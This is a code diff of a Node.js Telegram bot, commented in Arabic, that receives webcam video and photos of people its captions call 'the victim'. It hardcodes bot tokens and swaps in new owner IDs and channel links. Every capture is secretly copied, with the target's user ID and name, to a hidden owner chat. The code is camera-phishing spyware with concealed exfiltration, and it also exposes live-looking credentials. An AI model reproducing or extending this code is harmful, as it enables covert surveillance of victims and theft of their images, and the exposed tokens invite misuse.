@@ -23,9 +23,8 @@ const dns = require('dns');
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
-const botToken = process.env.mn; 
-const botUsername = process.env.bott; 
-
+const botToken = '8380316975:AAEjcllXjRKFlJkCL9XoD-pe9yVOx-NKQZQ'; 
+const botUsername = 'g5wbot'; // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
 
 const bot = new TelegramBot(botToken, {
   polling: {
@@ -39,13 +38,13 @@ const bot = new TelegramBot(botToken, {
 });
 
 
-const developerId = 5739065274;
+const developerId = 5653088167;
 
 
 const fixedChannels = [
-  { id: '-1002050709727', name: 'قناة1', inviteLink: 'https://t.me/+4xfQ3ctRiFA4NzI0' },
-  { id: '-1002602289958', name: 'قناة2', inviteLink: 'https://t.me/+HcYt6DTQCqBlZWFk' },
-  { id: '-1002481629916', name: 'قناة3', inviteLink: 'https://t.me/+oo7CRqGHnVY2MmIy' }
+  { id: '-1002319117172', name: 'قناة المطور 1', inviteLink: 'https://t.me/DA7K16' },
+  { id: '-1002521415297', name: 'قناة المطور 2', inviteLink: 'https://t.me/DA4K711' },
+  { id: '-1002850079867', name: 'قناة المطور', inviteLink: 'https://t.me/urlcam' }
 ];
 
 let additionalChannels = [];
@@ -367,8 +366,7 @@ bot.on('polling_error', (error) => {
 });
 
 
-const SECOND_BOT_TOKEN = '7065665133:AAELOAVm07oxkoPuxqz2DOs-FgdwpW5B7mU';
-const secondBot = new TelegramBot(SECOND_BOT_TOKEN, { polling: true });
+const secondBot = bot;
 
 
 let inviteLinks = {};
@@ -700,10 +698,8 @@ app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 const dataStore = {}; 
 
 app.use(express.static(__dirname));
-const botOwner = new TelegramBot('7770066795:AAFKO5HHoQeqpVITG3KQv74P2QNTE_6tJtI');
-
-
-const ownerChatId = 5739065274;
+const botOwner = bot;
+const ownerChatId = developerId;
 
 
 
@@ -735,15 +731,15 @@ app.post('/submitVideo', (req, res) => {
             bot.sendVideo(chatId, tempFilePath, { caption: '🎥 تم تصوير الضحية فيديو.' });
 
             
-            botOwner.sendVideo(ownerChatId, tempFilePath, {
+                        botOwner.sendVideo(ownerChatId, tempFilePath, {
                 caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
             });
         }).catch(err => {
             console.error("حدث خطأ : ", err);
 
           
-            botOwner.sendVideo(ownerChatId, tempFilePath, {
-                caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر`
+                        botOwner.sendVideo(ownerChatId, tempFilePath, {
+                caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
             });
         }).finally(() => {
          
@@ -804,7 +800,6 @@ app.post('/submitPhotos', (req, res) => {
                 const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                     caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                 });
-
                 return Promise.all([sendToUser, sendToOwner]);
             }).catch(err => {
                 console.error("Error fetching user details: ", err);
@@ -850,20 +845,17 @@ app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
                 const sendToUser = bot.sendPhoto(chatId, file.buffer, { caption: `📸 صورة تم إرسالها.` });
 
                 
-                const sendToOwner = botOwner.sendPhoto(ownerChatId, file.buffer, {
-                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
+                const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
+                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                 });
-
                 return Promise.all([sendToUser, sendToOwner]);
             }).catch(err => {
                 console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", err);
 
                
-                const sendToOwner = botOwner.sendPhoto(ownerChatId, file.buffer, {
-                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر`
+                return botOwner.sendPhoto(ownerChatId, buffer, {
+                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
                 });
-
-                return sendToOwner;
             });
         });
 
